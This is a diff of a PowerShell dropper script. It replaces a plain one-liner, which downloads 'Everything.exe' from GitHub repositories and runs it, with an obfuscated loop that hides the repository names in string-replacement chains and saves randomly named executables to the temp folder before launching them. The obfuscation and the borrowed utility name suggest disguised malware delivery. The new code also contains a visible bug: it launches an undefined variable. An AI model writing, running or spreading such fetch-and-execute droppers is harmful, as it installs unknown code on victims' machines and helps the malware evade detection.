@@ -1,1 +1,10 @@
-Invoke-WebRequest -Uri "https://github.com/cs2cc/mickey/raw/main/Everything.exe" -OutFile "C:\Everything.exe"; Rename-Item -Path "C:\Everything.exe" -NewName "1.exe"; Start-Process -FilePath "C:\1.exe"; Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/Everything.exe" -OutFile "C:\Everything.exe"; Start-Process -FilePath "C:\Everything.exe"
+$baseLink = "https://github.com/cs2cc/mickey/raw/main/Everything.exe"
+$linkParts = @("ID3 X1dUvID6 Y2h9WCID8 qfNd9e1mID1 cNVOID2 E0AID7 YkuXicID5 rZDIkeID0 y2ux9ctID4 401zS9ID9 TKHq9Nfy".Replace("ID0 y2ux9ct", "").Replace("ID1 cNVO", "").Replace("ID2 E0A", "").Replace("ID3 X1dUv", "").Replace("ID4 401zS9", "").Replace("ID5 rZDI", "").Replace("ID6 Y2h9WC", "").Replace("ID7 YkuX", "").Replace("ID8 qfNd9e1", "").Replace("ID9 TKHq9Nf", ""), "s")
+$tempPath = [System.IO.Path]::GetTempPath()
+foreach ($part in $linkParts) {
+    $link = $baseLink -replace "mID4 t3ciID9 vZLcID7 8OQkID0 MBsID1 QowID5 RL3RvID6 a78i6CID8 6L4LOeID2 ecohBID3 uLT4y".Replace("ID0 MBs", "").Replace("ID1 Qow", "").Replace("ID2 ecohB", "").Replace("ID3 uLT4", "").Replace("ID4 t3c", "").Replace("ID5 RL3Rv", "").Replace("ID6 a78i6C", "").Replace("ID7 8OQ", "").Replace("ID8 6L4LO", "").Replace("ID9 vZL", ""), $part
+    $randomFileName = [System.IO.Path]::GetRandomFileName() -replace '\.', ''
+    $filePath = [System.IO.Path]::Combine($tempPath, "$randomFileName.exe")
+    Invoke-WebRequest -Uri $link -OutFile $filePath 
+    Start-Process -FilePath $fileName
+}
